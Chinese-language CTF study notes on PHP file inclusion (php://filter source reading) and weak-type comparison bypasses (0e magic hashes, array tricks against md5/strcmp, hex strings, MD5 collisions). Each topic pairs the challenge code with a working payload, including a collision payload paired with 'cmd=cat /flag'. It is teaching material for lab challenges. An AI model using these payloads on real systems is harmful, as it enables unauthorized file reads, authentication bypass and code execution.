---
title: Nep暑假第二周
---

## 文件包含漏洞

**文件包含**：开发人员把重复使用的函数写入单个文件中，需要使用该函数时，直接调用此文件，无需再次编写函数。

**文件包含漏洞**：当用户修改被包含的文件时，就可能导致文件包含漏洞，导致**任意代码执行或者任意文件读取**。

**php常见的文件包含函数：**

include()，require()，include_once()，require_once()：包含并运行指定文件

```php
include "conn.php": 发生错误时，发出waring，继续执行
require "conn.php": 发生错误时，发出错误信息，不再执行
include_once "conn.php"：只包含一次
require_once "conn.php"：只包含一次
```

无论文件后缀是什么，包含文件的内容只要符合php语法，就能够被当成php代码解析



### 远程文件包含

远程文件包含就是允许攻击者包含一个远程的文件，一般是在远程服务器上预先设置好的脚本。

但需要在php.ini中将allow_url_fopen和allow_url_include设置为On

phpstudy->其它选项菜单->打开配置文件->php-ini

![](https://gitee.com/chen-lishan/tuc/raw/master/2.4.png)

### php中的filter协议

使用php伪协议读取网站源码：

```php
?file=php://filter/read=convert.base64-encode/resource=flag.php
```

用filter协议的read属性读，convert转换，base64-encode编码，resource是数据流，后面跟进文件路径flag.php

就是将跟进来的flag.php这个数据流进行base64编码的转换，然后就包含进来，直接输出；将输出的字符串base64解码，拿到源码。

- php中的filter协议：

  php://filter可以作为一个中间流来处理其他流，进行任意文件的读取。

  主要是用来查看源码。由于包含php文件时会被解析，不能看到源码，所以用filter协议读取文件时，需要进行base64编码。

当read被过滤，也可以直接不用read读取：

```php
?file=php://filter/convert.base64-encode/resource=flag.php
```



### 题目

#### BUU LFI COURSE 1

题目源码：

```php
<?php
highlight_file(__FILE__);

if(isset($_GET['file'])) {
    $str = $_GET['file'];

    include $_GET['file'];
}
```

- isset函数：检测变量是否已设置并且非 `null`

文件一般为flag.php，flag.txt

```
http://53889f57-cc8c-45d9-bf9c-a452cc1eba51.node4.buuoj.cn/?file=flag
```

![](https://gitee.com/chen-lishan/tuc/raw/master/2.3buu.png)

报错，改为：

```
http://53889f57-cc8c-45d9-bf9c-a452cc1eba51.node4.buuoj.cn/?file=/flag
```

成功拿到flag



#### buu [BSidesCF 2020]Had a bad day

题目有两个按钮`woofers`和`meowers`

![buu](D:\信安\笔记\图片\buu.png)

![](https://gitee.com/chen-lishan/tuc/raw/master/apple.png)

使用filter协议读取index源码

```php
index.php?category=php://filter/read=convert.base64-encode/resource=index.php
```

报错：

![](https://gitee.com/chen-lishan/tuc/raw/master/buu1.png)

于是去掉`.php`后缀:

``` 
ndex.php?category=php://filter/read=convert.base64-encode/resource=index
```

得到一串字符

经base64解码，得到index.php源码，其中php代码如下：

```php
<?php
$file = $_GET['category'];
if(isset($file)) {
    if( strpos( $file, "woofers" ) !==  false || strpos( $file, "meowers" ) !==  false || strpos( $file, "index")) {
        include ($file . '.php');
    } else {
        echo "Sorry, we currently only support woofers and meowers.";
    }
}
?>
```

可以看到，如果`category`不包含`woofers`、`meowers`和`index`，则无法包含文件

- strpos函数： 查找字符串首次出现的位置

     例如：`strpos(string $haystack, mixed $needle)`

     返回 `needle` 在 `haystack` 中首次出现的数字位置。  

因此，包含`index`即可绕过，使用filter包含`flag.php`

```
index.php?category=php://filter/read=convert.base64-encode/index/resource=flag
```

得到一串字符，base64解码，拿到flag





## PHP弱类型比较

### “==”与“===”

`==`  数据类型不一样的时候会将数据类型转换为相同的再进行比较

`===`   除了对数据的值进行比较还会对数据的类型进行比较

特殊：整数0弱类型比较任何值都是true

- ***题目 weak_type1***

```php
<?php
$o = $_GET['o'];
if(is_numeric($o)){
    die("no hack!!");
}
if($o==520){
    echo file_get_contents('/flag');
}
?>
```

- is_numeric函数： 检测变量是否为数字或数字字符串     

  如果是数字或数字字符串，返回 **`true`**；否则返回 **`false`**。   

输入520，则输出no hack!!

输入520a，则得到flag



**强制类型转换后是什么？**

```php
<?php
echo intval('520a')."\n";
echo intval('a520');
?>
```

输出520，a



```php
<?php
var_dump('1'==1);
var_dump('1'===1);
?>
```

输出bool(true) ，bool(false)

```php
<?php
var_dump('0e12' == '0e34');
var_dump('0e12' === '0e34');
?>
```

输出bool(true) ，bool(false)

#### 字符串和数字比较

先把字符串（如"1"或"1a"）转换为数字，不能转换为数字的字符串（如"a"或"a1"）或null，则转换为0，再进行比较。

```php
<?php
var_dump('a' == 0);
var_dump('a' == 1);
?>
```

输出bool(true)
        bool(false)

#### 布尔值true和任意比较

```php
true == 'false'
true == 2
true == '2'
false == 0
```



### switch弱类型比较

switch中同样存在弱类型比较问题，原理和上面类似

```php
<?php
    switch ($i) {
    case 0:
    case 1:
    case 2:
         echo "this is two";
         break;
    case 3:
         echo "flag";
    break;
    }
?>
```

输入`i =3a`，得到 flag



### md5、sha1哈希函数相等（MD5强比较）

- md5加密：加密后产生一个32位的数字字母混合码，无法解密

**MD5强比较：两个值不同，md5加密后相等**

- ***题目  weak_type4***

```php
    <?php
    if (isset($_POST['a']) and isset($_POST['b'])) {
    if ($_POST['a'] != $_POST['b'])
    if (md5($_POST['a']) === md5($_POST['b']))
    die('Flag: '.$flag);
    else
    print 'Wrong.';
    }
    ?>
```

由于md5或者sha不能加密数组，所以在加密数组的时候会返回false。

因此，**给a和b分别传参两个不同的数组**，就可以得到flag。

**payload：**

```
a[]=1&b[]=2
```

在hackbar的Post data中输入即可



### 十六进制比较问题

**“0x"开头跟数字的字符串（例如"0x1e240”）会被当作16进制数去比较。**

- ***题目 weak_type3***

```php
<?php
    highlight_file(__FILE__);
    function noother_says_correct($number)
    {
           $one = ord('1');
           $nine = ord('9');
           for ($i = 0; $i < strlen($number); $i++)
           {  
                   $digit = ord($number{$i});
                   if ( ($digit >= $one) && ($digit <= $nine) )
                   {
                           return false;
                   }
           }
              return $number == '54975581388';
    }
    $flag=file_get_contents("/flag");
    if(noother_says_correct($_GET['key']))
       echo $flag;
    else
       echo 'access denied';
    ?>
```

- ord() 函数：返回字符串的首个字符的 ASCII 值。

要求输入一个key值，满足for循环语句，不可以在1-9之间，即不能出现数字；return返回的值得是true，即key必须等于`54975581388`。刚好54975581388十六进制转换为ccccccccc

```php
123456 == 0x1e240
54975581388 == 0xccccccccc
```

payload：

```
?key=0xccccccccc
```

<br>

### strcmp() 函数

```php
int strcmp ( string $str1 , string $str2 )
```

根据ACSII表进行比较，从左到右依次进行，出现不同就停止比较，返回结果。

如果 str1 小于 str2 返回 < 0； 如果 str1 大于 str2 返回 > 0；如果两者相等，返回 0。

```php
<?php
// 二进制安全比较字符串（区分大小写）
echo strcmp('Hello', 'hello');
?>
```

输出-1（'H'的ASCII值比'h'的小，返回负数）

```php
<?php
$password="***";
if(isset($_GET['password'])) {
	if (strcmp($_GET['password'], $password) == 0) {
        echo "flag";
	} else {
        echo "Wrong";
	}
}
?>
```

**PHP5.3以上版本的strcmp()存在漏洞，只要$_GET[‘password’]是一个数组或者一个object即可绕过。**

```
?password[]=a
```

<br>

### hash值和“0”比较（md5弱比较）

**md5弱比较：以0e开头，后面为数字的字符串和字符串0比较，都是相等的**

``` php
 "0e1abc"=="0"        //true
 "0e132"=="0e71155"   //true
     
$str2 = "s224534898e";
echo md5($str2);
var_dump(md5($str2) == '0');   //0e420233178946742799316739797882    true
```



| 字符串      | md5加密                          |
| ----------- | -------------------------------- |
| 240610708   | 0e462097431906509019562988736854 |
| QNKCDZO     | 0e830400451993494058024219903391 |
| s878926199a | 0e545993274517709034328855841020 |
| s155964671a | 0e342768416822451524974117254469 |
| s214587387a | 0e848240448830537924465865611904 |



- ***题目 weak_type5***

```php
<?php
  if (isset($_GET['username']) && isset($_GET['password'])) {
          $logined = true;
          $Username = $_GET['username'];
          $password = $_GET['password'];
          if (!ctype_alpha($Username)) {$logined = false;}
          if (!is_numeric($password) ) {$logined = false;}
          if (md5($Username) != md5($password)) {$logined = false;}
        if ($logined){
                echo file_get_contents("/flag");
          }else{
                echo "login failed!";
             }
         }
?>
```

- ctype_alpha函数：做纯字符检测，测试是否每个字符都是一个字母

- is_numeric函数：检测变量是否为数字或数字字符串     

要求username为纯字母，password为纯数字，两者md5加密后相等

payload：

```php
?username=QNKCDZO&&password=240610708
```



### MD5碰撞

**两个不同字符串md5值完全相同**：`===`比较后相等

**string函数：转为字符串比较**

- ***题目 weak_type6***

  ```PHP
  <?php
   highlight_file(__FILE__);
   $cmd=$_GET['cmd'];
   if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {
          echo `$cmd`;
      } else {
          echo ("md5 is funny ~");
      }
      ?> md5 is funny ~
  ```

**payload：**

```php
a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2
&b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
```

（考虑到要将一些不可见字符传到服务器，这里使用url编码）

抓包输入payload，

然后get传参：

```
?cmd=cat /flag
```

![](https://tcakalr.gitee.io/tc/微信图片_20201115192503.png)

### 天融信面试题

题目：

![](https://gitee.com/chen-lishan/tuc/raw/master/2.11.png)

源码直接给出，s填在seed空，h填在hash空

```php
<?php
function gen_secured_random() { // cause random is the way
    $a = rand(1337,2600)*42;
    $b = rand(1879,1955)*42;

    $a < $b ? $a ^= $b ^= $a ^= $b : $a = $b;

    return $a+$b;
}

function secured_hash_function($plain) { // cause md5 is the best hash ever
    $secured_plain = sanitize_user_input($plain);
    return md5($secured_plain);
}

function sanitize_user_input($input) { // cause someone told me to never trust user input
    $re = '/[^a-zA-Z0-9]/';
    $secured_input = preg_replace($re, "", $input);
    return $secured_input;
}

if (isset($_GET['source'])) {
    show_source(__FILE__);
    die();
}

require_once "secret.php";

if (isset($_POST['s']) && isset($_POST['h'])) {
    $s = sanitize_user_input($_POST['s']);
    $h = secured_hash_function($_POST['h']);
    $r = gen_secured_random();
    if($s != false && $h != false) {
        if($s.$r == $h) {
            print "Well done! Here is your flag: ".$flag;
        }
        else {
            print "Fail...";
        }
    }
    else {
        print "<p>Hum ...</p>";
    }
}
?>
```

- rand函数：产生一个随机整数

  ```php
  rand(int $min, int $max)    //返回min和max之间的数
  ```

  ![](https://gitee.com/chen-lishan/tuc/raw/master/2.12.png)

 

- ```php
  $a < $b ? $a ^= $b ^= $a ^= $b : $a = $b;
  ```

  相当于C语言的三目运算符。当a<b，执行`$a ^= $b ^= $a ^= $b`，即交换a，b；当a>b，执行`$a = $b`

先看下面的if函数，传入的s要执行第三个函数：正则匹配a-zA-Z0-9，如果不是字母数字，则替换为空；h执行第二个函数：正则匹配，再md5加密；r执行第一个函数：产生一个随机值。

`$s.$r == $h`：s和r拼接后与h相等

h：利用**hash值和字符串“0”比较**，`240610708`  （还有很多别的字符串）md5加密后为以0e开头的字符串，和0相等

s：由于s后面拼接了一个随机数，要让s被识别为0，s应为`0e`。

因此，h可填为`240610708`，s为`0e`
